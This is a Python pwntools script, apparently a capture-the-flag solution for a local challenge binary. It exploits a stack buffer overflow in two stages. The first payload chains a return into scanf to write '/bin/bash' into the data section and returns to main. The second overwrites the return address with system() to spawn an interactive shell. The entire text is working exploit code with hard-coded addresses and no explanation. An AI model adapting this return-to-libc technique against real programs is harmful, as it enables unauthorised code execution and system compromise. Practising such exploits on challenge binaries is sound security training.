from pwn import *
p = process("./pwn1_c1d0173e20a08feff046c8433f53fd37")
# gdb.attach(p)
scanf_addr = 0x8048410
s_addr = 0x8048629
data_addr = 0x804a028
main_addr = 0x8048531
system_addr = 0x80483e0
# payload = "a"*52 + 'b'*4 + "\n"
payload = "a"*52 + p32(scanf_addr) + p32(main_addr) + p32(s_addr) + p32(data_addr)+ "\n"
payload2 = "a"*(52-8) + p32(system_addr) + p32(0x90909090) + p32(data_addr) + "\n"
p.send(payload)
p.send("/bin/bash\n")
p.send(payload2)
p.interactive()
